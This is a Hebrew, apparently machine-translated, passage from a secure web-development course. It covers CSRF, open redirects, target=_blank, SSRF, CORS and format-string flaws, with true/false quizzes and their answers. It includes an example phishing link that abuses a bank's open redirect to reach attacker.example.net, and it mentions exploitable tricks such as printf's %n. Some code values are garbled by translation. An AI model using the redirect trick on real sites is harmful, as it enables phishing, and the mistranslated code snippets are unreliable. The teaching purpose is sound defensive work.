סוג אחר של התקפה שאתרי אינטרנט היו פגיעים אליה לעתים קרובות נקרא זיוף בקשות חוצה אתרים (CSRF או XSRF). זה פחות בעיה היום, אבל זה עדיין יכול לקרות, אז בואו ללמוד מה זה ואיך זה יכול להיות נגד. CSRF הוא גם דוגמה מצוינת לאופן שבו פגיעויות אבטחה ספציפיות יכולות להפוך לפחות נפוצות עם הזמן; אם אתה יכול, נסה למצוא דרכים כלליות לחסל סוגים אחרים של פגיעויות!

בהתקפת CSRF, תוקף מרמה את המשתמש לשלוח נתונים לשרת, **כאשר השרת מפרש את הבקשה כבקשה מהמשתמש ופועל ישירות עליה. לדוגמה, התוקף יכול ליצור טופס עם לחצן שליחה באתר האינטרנט של התוקף, אך להורות לדפדפן האינטרנט של המשתמש לשלוח את הטופס המלא לשרת שיפעל על גבי טופס זה. שים לב שאם המשתמש מחובר לאותו שרת (נניח עבור בנק), השרת יראה שהמשתמש באמת מחובר לבנק, ועשוי להשתכנע לעשות משהו שהמשתמש לא התכוון אליו (כגון העברת כסף רב לתוקף).

במובנים מסוימים, התקפת CSRF היא ההפך מהתקפת XSS. XSS מנצל את אמון המשתמש בשרת; CSRF מנצל את האמון של השרת בלקוח (שהמשתמש למעשה מבצע בכוונה בקשה נתונה). במילים אחרות: XSS מרמה לקוחות; CSRF שולל שרתים.

אמצעי נגד נפוץ המשמש כיום ברוב מסגרות יישומי האינטרנט הנפוצות הוא לשלוח אסימון CSRF סודי ספציפי למשתמש בכל הטפסים ובכל כתובות URL אחרות עם תופעות לוואי, ולאחר מכן לבדוק כדי לוודא שהסוד הנכון כלול בכל בקשה עם תופעת לוואי. מכיוון שהתוקפים לא יידעו את הערך הסודי, התוקף אינו יכול להוסיף אסימון CSRF תואם. מכיוון שזה מובנה כמעט בכל מסגרות האינטרנט הנפוצות כיום, יישומים רבים מוגנים באופן אוטומטי מפני CSRF (אלא אם כן הם משביתים את ההגנה או לא משתמשים כראוי במסגרת). עליך להעדיף מסגרת יישום אינטרנט הכוללת מנגנון אסימון CSRF.

אמצעי נגד נפוץ נוסף המשמש כיום הוא מה שנקרא  עוגיות **SameSite**. מבחינה היסטורית, כל קובצי ה-Cookie נשלחו לשרת בכל פעם שלמשתמש היו קובצי Cookie תואמים עבור אותו שרת, גם כאשר הדף הראשי שהוצג היה משרת אחר. לדוגמה, דף אינטרנט באתר BB עשוי לכלול הפניה לתמונה באתר CC; כאשר דפדפן האינטרנט הוריד את התמונה מ- CC הוא היה שולח את כל העוגיות הקשורות. עם זאת, זה לא ממש הגיוני; במקרים רבים אין לשלוח קובצי Cookie אם האינטראקציה נגרמה על-ידי שרת שאינו קשור. אז דפדפנים מודרניים יש הגדרה אופציונלית **SameSite** על עוגיות. אם ההגדרה היא **Lax** או **Strict**, בקשה הנגרמת על-ידי תוקף בשרת אחר לא תגרום לשליחת קובץ ה-Cookie (כמו הפעלה). אז כל עוד לעוגיות ההפעלה שלך יש  הגדרת **SameSite** של **Lax** או **Strict**, התקפות CSRF בדרך כלל לא עובדות. אפילו טוב יותר, דפדפנים מודרניים פועלים כדי להפוך את **SameSite=Lax** לברירת המחדל. עדיף להגדיר  את **SameSite ל-Lax ** או **ל-Strict** בעצמך, אבל ברירת מחדל מאובטחת היא עדיין דבר טוב.** **

בקיצור, פגיעויות CSRF הופכות פחות נפוצות מכיוון שהתעשייה נעה לעבר ברירות מחדל בטוחות. זה מראה *שניתן* להפחית את הסבירות של סוגים שלמים של פגיעויות על ידי תכנון או שינוי מערכות כך שברירת המחדל תהיה מאובטחת. במידת האפשר, בנה אמצעי נגד לכלים/תקנים/מערכת כדי שהבעיה לא תתרחש. אם אתה בונה יישום אינטרנט חדש, זה הרבה פחות סביר להיות בעיה, אבל ודא כי מסגרת האינטרנט שלך נגד זה וכי אתה משתמש במנגנונים שלה כראוי.

 למרות שזה הופך להיות פחות נפוץ, זיוף בקשות חוצה אתרים (CSRF) הוא עדיין סיבה נפוצה מספיק של פגיעויות אבטחה כי זה 2019 CWE Top 25 #9. הוא מזוהה גם כ [- CWE-352](https://cwe.mitre.org/data/definitions/352.html). פעם זה היה בטופ 10 של OWASP. זה לא במהדורת 2017, כי כל כך הרבה מסגרות מודרניות עכשיו למנוע את זה, אבל זה עדיין חשוב אם התוכנה שלך פגיע לזה.

כמובן, ישנן דרכים אחרות שבהן תוקף עשוי להיות מסוגל להשיג שליטה זמנית על המערכת של המשתמש. לכן, ייתכן שעדיין תרצה ליישם כמה אמצעי נגד מסורתיים אחרים של CSRF, כגון:

1. נתק משתמשים באופן אוטומטי לאחר פרק זמן מסוים, או זמן מסוים של חוסר פעילות.

2. אם פעולה מסוימת מסוכנת במיוחד (למשל, מחיקת חשבון או העברת סכום כסף גדול), דרוש אישור מאומת נוסף נפרד שהמשתמש באמת מבקש זאת. זה טוב בכל מקרה, מכיוון שישנן דרכים רבות שבהן תוקף יוכל להשיג שליטה זמנית על חשבון; הגבלת ההשפעה היא כולה חלק מניהול הסיכונים.

#### חידון 4.6: CSRF / XSRF

פגיעויות \>\>CSRF נפוצות פחות כיום מכיוון שלמסגרות יישומי אינטרנט ודפדפני אינטרנט יש בדרך כלל אמצעי נגד כדי להפוך פגיעויות אלה לפחות סבירות. אמת או שקר?<<

(x) נכון

( ) לא נכון

[הסבר]

זה נכון! זה מראה שלפעמים ** אפשר לשנות מערכות כדי להפחית את הסבירות של סוגים שלמים של התקפות. אתה צריך גם לחפש ללא הרף דרכים לחסל סוגים שלמים של התקפות, או ביישום הספציפי שלך או בעולם בכלל.

[הסבר]

### פתיחת הפניות והעברות

[יישום אינטרנט]

יישום אינטרנט לא אמור לקבל קלט בשליטת המשתמש המציין קישור לאתר כלשהו בשרת אחר ולאחר מכן, ללא בקרות קפדניות, להשתמש בקישור זה כדי לבצע ניתוב מחדש. יישום אינטרנט שעושה זאת יש *ניתוב מחדש פתוח*.

זה יכול להיות קשה להבנה, אז בואו נסתכל על דוגמה. בואו נדמיין שליישום אינטרנט בצד השרת יש קישור "**/redirect**" שמקבל **כתובת url** של פרמטר=, ואז פשוט מפנה בקשות לערך **url=** . משמעות הדבר היא שתוקף יכול ליצור קובץ HTML בכל מקום שנראה כך (הדוגמה מבוססת על טקסט בטקסט של MITRE ב- [CWE-601](https://cwe.mitre.org/data/definitions/601.html)):

<b><a href="https&#58;//bank.example.com/redirect?url=https&#58;//attacker.example.net"> לחצו כאן להתחברות>/a></b>

מה הבעיה? הבעיה היא שמשתמש שבדק את הקישור יחשוב שהקישור הזה עבר לדומיין מהימן (למשל, **bank.example.com**). אמנם מבחינה טכנית זה נכון, אך כאשר לוחצים עליו, הדומיין המהימן לכאורה יפנה את המשתמש בשקט לתחום אחר שעלול להיות מסוכן ולא למה שהמשתמש ציפה (למשל, **attacker.example.net**). באופן כללי יותר, הבעיה היא שניתן להשתמש בהפניה פתוחה כדי להטעות בני אדם וליצור התקפות פישינג חזקות יותר. ניתן לגרום לבני אדם לחשוב שהם הולכים לתחום מהימן, מבלי להבין שהם למעשה יועברו באופן מיידי לתחום לא מהימן. בתיאוריה, המשתמשים צריכים גם לבדוק *היכן הם נמצאים כעת* בכל דף, אך בני אדם עסוקים לעתים קרובות לא עושים זאת. אנחנו רוצים להקשות, לא להקל, לשטות בבני אדם עסוקים.

בעיה קשורה היא "קדימה", שבה יישום האינטרנט מעביר את הבקשה לחלק אחר של יישום האינטרנט. יישום האינטרנט עשוי להציג את הבקשה באופן שגוי כבקשה *פנימית* מיישום האינטרנט עצמו, במקום להגיע בצורה מדויקת יותר ממשתמש חיצוני, ולהעניק לו הרשאות לא מוצדקות.

 [גיליון הרמאות של OWASP על הפניות והעברות לא מוערכות](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html) דן באמצעי נגד אפשריים שונים:

* *"פשוט הימנעו משימוש בהפניות ובהעברות.*

* *אם נעשה שימוש, אל תאפשר את כתובת ה- URL כקלט משתמש עבור היעד.*

* *במידת האפשר, בקש מהמשתמש לספק [a] שם קצר, מזהה או אסימון הממופה בצד השרת לכתובת URL מלאה של היעד.*

  * *הדבר מספק את רמת ההגנה הגבוהה ביותר מפני התקפה, הפוגעת בכתובת ה-URL.*

  * *היזהר שפעולה זו אינה יוצרת פגיעות ספירה שבה משתמש יכול לעבור על מזהים באופן מחזורי כדי למצוא את כל יעדי הניתוב מחדש האפשריים*

* *אם לא ניתן להימנע מקלט משתמש, ודא שהערך שסופק חוקי, מתאים ליישום ומורשה עבור המשתמש.*

* *חטא קלט על-ידי יצירת רשימה של כתובות URL מהימנות (רשימות של מארחים או regex).*

  * *זה צריך להתבסס על גישת ה-allowlist, ולא על הכחשה".*

 הפניות פתוחות הן סיבה נפוצה כל כך לפגיעויות אבטחה שחולשה זו היא 2021 CWE Top 25 #37 ו- 2019 CWE Top 25 #32. זה [CWE-601](https://cwe.mitre.org/data/definitions/601.html).

#### חידון 4.7: פתח הפניות והעברות

\>\>זה בסדר לתמוך בכתובת URL של מנתב, למשל, **<https://bank.example.com/redirect?url=https://dangerous.example.com>**כל עוד כתובת ה- URL מחוטאת בקפידה כדי לאפשר רק כתובות URL מהימנות. אמת או שקר?<<

(x) נכון

( ) לא נכון

[הסבר]

זה נכון! הבעיה היא לא ניתוב מחדש, זה ניתוב מחדש *ללא התערבות* . כמובן, אם אתה לא מאפשר ניתוב מחדש בכלל, זה אפילו בטוח יותר, אבל לכל הפחות חשוב לאמת את הניתוב מחדש כדי להבטיח שזה ערך שאתה מצפה.

[הסבר]

### יעד **HTML ** וחלון JavaScript.open**()**

[יישום אינטרנט]

קיימת בעיה מוזרה עם  תכונת **היעד** HTML  שאנשים רבים אינם מודעים לה. בואו נסביר את הבעיה, וכמה פתרונות חלקיים.

ב-HTML, **<a href=... >** יוצר היפר-קישור. מבנה HTML **<a href=... יעד = ... >** יוצר  היפר-קישור שבו, אם תלחץ עליו, הוא יוצר "יעד" חדש. ערך ברירת המחדל עבור  יעד הוא &#95;self; **אם תגדיר **יעד**, ערך נפוץ הוא **target="&#95;blank"** שיוצר את היעד בכרטיסייה חדשה.**

אבל מה שרבים לא מבינים הוא שערך של "**יעד**" שאינו ברירת המחדל "**&#95;self**" עלול, במקרים מסוימים, ליצור פגיעות. בגלל האופן שבו הוא פועל, הדף המקושר אליו פועל *באותו* תהליך כמו הדף הקורא. כתוצאה מכך, בלחיצה הדף המקבל מקבל מקבל שליטה חלקית על הדף המקשר, *גם אם הם ממקורות שונים*. הדרך העיקרית שבה זה קורה היא דרך  הערך **window.opener.** הדף המקבל יכול לעשות דברים כמו לאלץ  את הדף *הקורא* לנווט לדף אחר (למשל, **window.opener.location.href = newURL**), לספק דף חדש שנראה כמו הדף הישן (למרות שהוא נמצא במקום אחר), ולהטעות את המשתמש לעשות משהו בדף "אותו" שאינו זהה כלל. בעיה קשורה היא שהדף החדש עשוי לקבל גם מידע "מפנה" שאולי לא ציפית לו.

אותו סוג של בעיה יכול לקרות ב- JavaScript. ל-"**window.open**" של JavaScript יש יעד ברירת מחדל של** "&#95;blank**"; מכיוון שזה לא "**&#95;self**", *ערך ברירת המחדל* של **window.open()** אינו מאובטח. שוב, הוא יפתח חלון שטוען דף אחר שמקבל בו זמנית שליטה על דף הקריאה שלו, *גם אם* יש להם מקורות שונים.

כמובן, אם אתה יכול לסמוך על הדף האחר הזה, זו לא בעיית אבטחה. אז שימוש בערך יעד הוא לעתים קרובות לא בעיה כל עוד אתה מתייחס לאתר שלך ** . אבל אם אתה מתכוון לאתר אחר, זה עשוי להיות יותר דאגה - האם אתה בטוח שאתה יכול לסמוך על זה? גם אם אתה סומך על אתר משלך או על אתר אחר, ייתכן שזה לא חכם לאפשר זאת - מה קורה אם מישהו פורץ לחלק זה או לאתר אחר? שוב, יש את העיקרון של פריבילגיה מינימלית - אנחנו לא רוצים לתת פריבילגיות אם אנחנו לא צריכים. זו יכולה להיות גם בעיית ביצועים מינורית; ביצועי הדף עלולים להיפגע עקב שימוש בתהליך משותף.

הפתרון הפשוט ביותר הוא להימנע משימוש ב**- target=...**  ב- HTML, ותמיד להגדיר **יעד = "&#95;עצמי"** כאשר קוראים JavaScript **חלון.open()...**  במיוחד עבור קישורים לתוכן שנוצר על ידי משתמשים ולדומיינים חיצוניים. אם תחליט להשתמש  ב- HTML **target=**, השתמש גם ב**- rel="noopener noreferrer".** ה"**noopener**" מורה לדפדפן האינטרנט * לא  לאפשר ל-JavaScript להשיג שליטה על החלון המפנה (כך *ש-window.opener **לא** ייתן גישה אליו). ה-"**noreferrer**" מונע העברת פרטי המפנה ללשונית/חלון החדש ([*פגיעות אבטחה והשפעה על ביצועי הדפדפן של Target="&#95;blank"*](https://medium.com/@darrensimio/security-vulnerability-and-browser-performance-impact-of-target-blank-80e5e67db547) מאת Darren Sim, 2019).

#### חידון 4.8: **יעד HTML ** וחלון JavaScript.open**()**

\>\>בעוגן HTML (**<a href=... >**) לאתר אחר, אם אתה משתמש ב**- target=...**  עם ערך שאינו **&#95;self**, הקפד גם להגדיר "**rel**" ל "**noopener noreferrer**" למנוע שליטה על ידי אותו אתר אחר של הכרטיסייה המקור. נכון או לא נכון?<<

(x) נכון

( ) לא נכון

[הסבר]

זה נכון! כן, זו נקודה מוזרה ומעודנת. יש סיבה לקוות כי התפתחויות עתידיות ב- HTML ו- JavaScript יסגרו את חור האבטחה הבלתי צפוי הזה, אבל לעת עתה, חשוב לדעת על זה.

[הסבר]

### שימוש בכתובות URL לא בדוקות כראוי / זיוף בקשות בצד השרת (SSRF)

מאתר משאבים אחיד (URL) הוא דרך להתייחס למשאב אינטרנט ספציפי לפי מיקום. מבחינה טכנית, כתובת URL היא סוג מסוים של מזהה משאבים אחיד (URI), אך למטרותינו נשתמש במונחים לסירוגין. כפי שצוין ב- [IETF RFC 3986](https://tools.ietf.org/html/rfc3986), ל- URI כללי יש תחביר זה:

**סכימה:[סמכות]נתיב[?שאילתה]&#8202;[&#35;קטע]**

ולסמכות **** יש את התחביר הזה:

**[userinfo @]מארח[:נמל]**

לפעמים משתמשים לא מהימנים יתנו לך נתונים שבהם ברצונך להשתמש ככתובת URL (או יהפכו לכתובת URL) כדי לבקש מידע נוסף. עם זאת, זה יכול להיות מסוכן. אם תכלול כתובת URL בנתונים שאתה מציג למשתמש, הוא עשוי לעשות את המקבילה ללחיצה עליה. מתברר שכתובות URL הן דברים רבי עוצמה, ותוקף עלול לנסות לנצל כל אחת מהיכולות שלו. לדוגמה:

* כתובת URL אינה צריכה להשתמש ב**- https**:  scheme; זה יכול להיות תוכניות אחרות ** כמו קובץ:  (כדי לאחזר קובץ מקומי) או אפילו תוכניות מעורפלות יחסית כמו **gopher:****.  התקפה ערמומית אחת היא לבקש תוכנית אחת (כמו "**גופר:**") לשירות שמצפה לפרוטוקול אחר לגמרי; ייתכן שתוקף יוכל להשתמש בבלבול זה כדי ליצור התקפה.

* "המארח" לא יכול להיות מה שאתה מצפה; המחשב המארח עשוי להתייחס למחשב שרירותי אחר או אפילו למחשב המבקש.

* תוקף עלול לספק **userinfo** (שם חשבון משתמש) ו/או יציאה. היציאה, לדוגמה, מאפשרת לכתובת URL לבקש חיבור בכל ** יציאה של מחשב.

* כתובת URL יכולה אפילו לקודד מגוון תווים עבור כל אחד מנתונים אלה.

אם שרת שולל לבקש כתובת URL לא מסומנת כראוי, הוא נקרא *זיוף בקשה בצד השרת* (SSRF).

הפתרון העיקרי הוא להבטיח שתגביל מאוד את האופן שבו אתה בונה כתובות URL שאתה מבקש. במידת האפשר, אל תשתמש בנתונים לא מהימנים כדי ליצור כתובות URL אלה. אם עליך להשתמש בנתונים לא מהימנים כדי לבנות כתובת URL (וזה קורה לעתים קרובות), הגבל באופן מרבי את כתובות ה- URL שניתן לבנות וודא שניתן לבנות רק כתובות URL *בטוחות*. לדוגמה, במקרים רבים כיום ניתן להגביל את כתובת האתר לסכימה אחת (**https:**), ובדרך כלל אין צורך לאפשר (לדוגמה) יציאות או שמות משתמש.

 זיוף בקשות בצד השרת (SSRF) הוא גורם כה נפוץ לפגיעויות אבטחה שהוא 2021 OWASP Top 10 #10, 2021 CWE Top 25 #24, ו- 2019 CWE Top 25 #30. זה [CWE-918](https://cwe.mitre.org/data/definitions/918.html).

#### חידון 4.9: שימוש בכתובות URL לא בדוקות כראוי / זיוף בקשות בצד השרת (SSRF)

\>\>כתובות URL הן רק דרכים לאתר מידע, ולכן אימותן אינו חשוב. אמת או שקר?<<

( ) נכון

(x) לא נכון

[הסבר]

ממש לא! במידת האפשר, אל תשתמש בנתונים לא מהימנים כדי ליצור כתובות URL אלה. אם אתה חייב (ולעתים קרובות אתה חייב), הגבל באופן מקסימלי את כתובות ה- URL שניתן לבנות וודא שניתן לבנות רק כתובות URL *בטוחות* .

[הסבר]

### מדיניות מאותו מקור ושיתוף משאבים בין מקורות (CORS)

[יישום אינטרנט]

כאשר דפדפן אינטרנט מקבל קובץ HTML, קובץ HTML רשאי להפנות באופן חופשי לתמונות, סרטוני וידאו, גיליונות סגנונות CSS וסקריפטים להפעלה. בדרך כלל דפדפן האינטרנט ינסה לאחזר אותם ולהשתמש בהם, ללא קשר לאתר שממנו מגיעים חומרים אלה.

עם זאת, כאשר דפדפן אינטרנט מאחזר ומפעיל קובץ Script (כגון JavaScript), יהיה זה מסוכן עבור דפדפן האינטרנט לאפשר לסקריפט זה לקיים אינטראקציה בקלות עם אתרי אינטרנט שרירותיים. אם זה היה מותר, סקריפט זדוני יכול לשלוח בחשאי נתונים פרטיים לכל אתר אחר, והסקריפט יכול גם לתקוף אתרים אחרים (למשל, על ידי ניצול פגיעויות או הפעלת מתקפת DDoS).

כדי למנוע בעיות אבטחה רבות, דפדפני אינטרנט אוכפים בדרך כלל על תוכניות JavaScript בצד הלקוח קבוצה של כללים הנקראת *מדיניות מאותו מקור*. במסגרת מדיניות אותו מקור, תוכניות JavaScript בצד הלקוח מורשות לקיים אינטראקציה רק עם אותו מקור, **כולל הצגת משאבים כלשהם. המקור של כתובת URL הוא השילוב של הפרוטוקול (בדרך כלל https), היציאה (443 כברירת מחדל עבור https) והמארח. לכן **<https://example.com/foo>** **<https://example.com/bar>**,  והם נחשבים בעלי אותו מקור כי יש להם את השילוב (https, 443, example.com). מטרת מדיניות אותו מקור היא לבודד מסמכים שעלולים להיות זדוניים (Mozilla, מדיניות  אותו [*מקור*](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)).

מדיניות אותו מקור מונעת בעיות אבטחה רבות, אך לעתים היא מחמירה מדי. אתר אינטרנט יכול לאפשר באופן ספציפי אינטראקציה באמצעות JavaScript ממקורות אחרים באמצעות שיתוף משאבים בין מקורות (CORS). CORS יכול להיות שימושי, שכן הוא מרגיע את ההגבלות של מדיניות אותו מקור. CORS יכול גם להיות בעיה, שכן CORS יכול לאפשר פגיעויות אם הוא בשימוש גרוע. CORS מצוין בפירוט רב [במפרט WHATWG Fetch](https://fetch.spec.whatwg.org/#http-extensions). מוזילה יש תיאור יפה של CORS בתיעוד שלהם[](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS). ביחידה זו, נסקור בקצרה את הדגשים, ונסכם חלק מהחומר מתיעוד ה- CORS של מוזילה.

בקצרה: CORS מאפשר לשרתי אינטרנט להצהיר אילו מקורות אחרים מורשים לגשת לאילו משאבים (כתובות URL), ואילו פעלי HTTP (**GET, **POST,** **DELETE** **וכו ') מותרים לאותם מקורות אחרים. דפדפני אינטרנט מבקשים מידע זה ומשתמשים בו כדי לקבוע אם תוכניות JavaScript בצד הלקוח מורשות לבצע בקשה חוצת מקורות (כלומר, פעולה מחוץ למקורן). מידע זה מוחלף באמצעות כותרות HTTP חדשות המוצאות פלט על-ידי דפדפן האינטרנט ושרת האינטרנט. בקשות CORS משמשות לבקשות **XMLHttpRequest** **ו-Fetch** ממקורות צולבים  (בין היתר).

ישנם שני סוגים של בקשות CORS, *בקשה פשוטה (כביכול) * ובקשה *עם בדיקת תקינות*. זוהי אופטימיזציה. בקשות פשוטות משתמשות באינטראקציה אחת, בעוד שבקשות מוצלחות שעברו בדיקת תקינות משתמשות בשתי אינטראקציות. כל בקשת CORS שלא ניתן לבצע עם בקשה פשוטה מיושמת באופן אוטומטי על ידי דפדפן האינטרנט עם בקשה לבדיקת תקינות. לבקשות עם בדיקת תקינות יש יותר השהיה מאשר לבקשה פשוטה, אז היכן שאתה *יכול*, כתוב את הקוד בצד הלקוח שלך כך שהוא ישתמש בבקשות פשוטות של CORS. לפעמים זה לא אפשרי, ואז תשמש באופן אוטומטי בקשה לבדיקת תקינות עם השהיה גבוהה יותר.

נעשה שימוש בבקשה פשוטה של CORS כאשר *כל* התנאים הבאים מתקיימים:

* השיטה המבוקשת היא **GET**, **HEAD** או **POST**

* כותרות הבקשה הן רק אלה שהוגדרו באופן אוטומטי על-ידי דפדפן האינטרנט (aka סוכן משתמש), המורחבות באופן אופציונלי עם כותרות *בקשה ברשימה הבטוחה של CORS*. דוגמאות לכותרות ברשימה הבטוחה הן  '**קבל**', 'קבל-שפה**', 'שפת תוכן**', ** 'רוחב יציאה' ו**' ** **רוחב**'.**

*   הכותרת **'סוג תוכן' ** היא אחת מהאפשרויות הבאות: **application/x-www-form-urlencoded**, ריבוי חלקים/טופס-נתונים**, או **טקסט/רגיל**.** 

* כמה דרישות אחרות מתקיימות גם כן. עיין במפרט לקבלת פרטים; ברוב המקרים דרישות אחרות אלה ייענו.

כאשר מתבצעת בקשה פשוטה של CORS, דפדפן האינטרנט מבצע את הבקשה כרגיל וגם מגדיר את מקור כותרת HTTP **** למקור הסקריפט. לאחר מכן, שרת האינטרנט קובע אם בקשה זו מקובלת. לאחר מכן, שרת האינטרנט משיב ומגדיר את כותרת ה- HTTP **Access-Control-Allow-Origin** עם מידע אודות המקורות המותרים. אם ערך זה הוא "**&#42;** ", אז *כל* מקור מותר גישה זו. דפדפן האינטרנט מסתכל על **Access-Control-Allow-Origin**, ואם המקור המבקש תואם, קובץ ה- Script מקבל את כל המידע שהוחזר.

בקשה לבדיקת תקינות, בניגוד לבקשה פשוטה, משתמשת בשלב נוסף. בבקשה עם בדיקת תקינות, דפדפן האינטרנט שולח תחילה  בקשת **OPTIONS** עם המקור **** ומידע נוסף, כדי לשאול את שרת האינטרנט אם הבקשה בפועל "*בטוחה לשליחה*". אם שרת האינטרנט מאשר אותו, הבקשה בפועל נשלחת. דפדפנים מסוימים אינם עוקבים אחר הפניות מחדש עבור בקשה עם בדיקת תקינות; עיין [בתיעוד CORS של Mozilla](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) לקבלת פתרונות אם זה חשוב לך.

כברירת מחדל, דפדפנים לא ישלחו אישורים (קובצי Cookie ופרטי אימות HTTP) בבקשת CORS. עם זאת, ניתן להגדיר דגל ספציפי באובייקט **XMLHttpRequest** או **** בבנאי בקשות לשליחת אישורים. אם פעולה זו נעשית, שרת האינטרנט חייב להחזיר **Access-Control-Allow-Credentials: true** או שתוכנית JavaScript לא תקבל את התוצאות. שרתי אינטרנט צריכים להיות זהירים מאוד בשימוש זה; אם הוא משמש בכלל, להיות בררן מאוד לגבי המקורות המותרים. זה הרבה יותר בטוח *לא* להשתמש ב**- Access-Control-Allow-Credentials**, מכיוון שהדבר מאפשר שליטה תוכניתית מאושרת ממקור אחר.

אם בכוונתך שמידע מסוים יהיה קריא באופן ציבורי בשרת האינטרנט שלך, והוא לעולם אינו משתנה (לא משנה מי ביקש אותו או מהיכן הוא מגיע), שקול להחזיר את "**גישה-שליטה-אפשר-מקור: &#42; **" כאשר דפדפן אינטרנט מנסה להשיג **** מידע זה. הדבר מאפשר לתוכניות JavaScript בצד הלקוח לאחזר מידע זה ישירות ולהשתמש בו עוד יותר. זה כן מאפשר לתוכנות JavaScript לבקש זאת שוב ושוב, כך שבתיאוריה זה הופך את התקפות DDoS למעט קלות יותר. עם זאת, עבור אתרים רבים המטרה היא להפיץ מידע מסוים, וניתן להתמודד עם DDoS בדרכים אחרות.

לפעמים המידע עשוי להשתנות בהתאם למקור של המבקש (זה נכון אם אתה מגדיר **גישה-בקרה-אפשר-מקור** לכל ערך שאינו "**&#42;** "). במקרים אלה, הקפד לכלול כותרת "**משתנה**" עם הערך "**מקור**".  ערך "**משתנה**" זה אומר לדפדפן האינטרנט כי התוצאה עשויה להשתנות בהתאם למקור, ולמנוע ממידע ממקור אחד לדלוף למקור אחר (או חוסר מקור) באמצעות CORS.

פרטים על אופן הפעלת CORS למגוון רחב של נסיבות זמינים ב- [enable-cors.org](https://enable-cors.org/). באפשרותך גם לעיין במשאבים הבאים לקבלת פרטים נוספים:

* [קבוצת עבודה של טכנולוגיית יישום היפרטקסט באינטרנט (WHATWG). ](https://fetch.spec.whatwg.org/)[*להביא*](https://fetch.spec.whatwg.org/)

* [תיעוד ](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)[*מדיניות מאותו מקור *](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)[של מוזילה](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)

* [תיעוד שיתוף משאבים חוצי מקורות (CORS) של Mozilla](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS).

### עיצוב מחרוזות ותבניות

הפקת תוצאות יכולה להיות מסובכת. כמעט לכל שפות התכנות יש מנגנונים מיוחדים כדי להקל על הפלט; אפילו הגרסה המקורית של FORTRAN משנת 1956 עשתה זאת ([*מערכת הקידוד האוטומטית של FORTRAN עבור IBM 704 EDPM: מדריך העזר למתכנת*](https://archive.computerhistory.org/resources/text/Fortran/102649787.05.01.acc.pdf), 1956)! מנגנונים אלה כוללים סוגים שונים של מחרוזות פורמט ומערכות תבניות. מנגנונים אלה יכולים להיות חזקים מאוד ולהאיץ את הפיתוח. הם יכולים גם להיות קריטיים להתמודדות עם פגיעויות; אחת הדרכים הטובות ביותר להתמודד עם התקפות סקריפטים חוצי אתרים (XSS) היא להשתמש במערכת templating שמנטרלת אותה כברירת מחדל, כפי שכבר דנו.

עם זאת*, היזהר מאוד* במתן אפשרות למשתמשים לא מהימנים לשלוט בפורמטי הפלט (כלומר, באמצעות מחרוזות פורמט ותבניות ממשתמשים לא מהימנים). במקרים רבים, אין לתת ** למשתמשים לא מהימנים להגדיר פורמטי פלט המשמשים מערכות טמפלציה למטרות כלליות מבלי לאמת אותם בקפידה תחילה. מערכות פורמט פלט מסוימות יכולות לבצע קוד שרירותי, או לחשוף מידע מעבר לקבוצה מסוימת של ערכים מאושרים - ואתה *בהחלט* לא צריך לאפשר זאת ברוב המקרים! גם כאשר הם לא יכולים להריץ  קוד *שרירותי*,  מעצם הגדרתם הם שולטים בפלט, והם עשויים להיות מסוגלים ליצור תוצאות מטעות או תוצאות שמכריעות בכל מקום שאליו הפלט הולך.

שגרות הפלט של שפת התכנות C מסוכנות במיוחד, מכיוון שהעיצוב שלהן מניח שהפרמטרים של מחרוזת הפורמט הם ממקורות מהימנים. לדוגמה, ** משפחת השגרות ** printf() (כולל fprintf  ו- **snprintf**) מקבלת ** פרמטר מחרוזת תבנית**; אם תוקף יכול לשלוט במחרוזת התבנית, התוקף יכול להפוך את התוצאה לארוכה באופן שרירותי באופן טריוויאלי (מה שמוביל לעתים קרובות לגלישת מאגר), להדפיס כל אזור זיכרון (חשיפת מידע או נתונים סודיים המאפשרים עקיפת אבטחה), או להשתמש ב**-**%n**  פעולה להחלפת אזורי זיכרון שרירותיים. הדבר נכון גם לגבי **syslog**() (הכותב מידע יומן מערכת) ו**- setproctitle() (**המגדיר את המחרוזת המשמשת להצגת מידע מזהה תהליך). פונקציות רבות עם שמות המתחילים "**לטעות" או "**להזהיר", המכיל "**יומן**", או מסתיים "**printf**" שווה סקירה.****

מערכות הפורמט של רוב שפות התכנות האחרות אינן מסוכנות כל כך, אך הן עדיין יכולות לגרום לבעיות. הפתרון הטוב ביותר הוא לוודא שמשתמש לא מהימן אינו יכול לספק את מחרוזת התבנית. אם הנסיבות מחייבות אותך  לאפשר זאת, *ודא* שהמערכת שבה אתה משתמש אינה יכולה לאפשר פגיעות, לדוגמה, על-ידי התרת סוגים מסוימים בלבד של תבניות (הקפד לאמת זאת!), או השתמש בספריה שתוכננה במיוחד לשימוש בטוח עם תבניות לא מהימנות. גם במקרים אלה, זכור שאם משתמש יכול לשלוט בתבנית הפלט, המשתמש יכול לייצר כמות עצומה של פלט. ודא שלא מדובר בבעיה רצינית (לדוגמה, על-ידי הבטחה שרק אותו משתמש יראה את התוצאות מאותה תבנית, כך שהתוקפים יתקפו את עצמם בסופו של דבר).

למערכות עיצוב פלט רבות יש דרך לתמוך בינאום (**i18n**) ולוקליזציה (**l10n**).  מערכת **gettext**() הנמצאת בשימוש נרחב  , לדוגמה, מאפשרת לך לבחור מחרוזת (כולל מחרוזת תבנית או תבנית) באמצעות האזור הנוכחי של המשתמש. הערך של האזור יסופק בדרך כלל על-ידי משתמש לא מהימן. עם זאת, זה בסדר כל עוד ההשפעה היחידה שלו היא לבחור בין מחרוזות תבנית או תבניות, שעל כולן אתה יודע שאתה יכול לסמוך.

>  שעת סיפור: Log4Shell / log4j

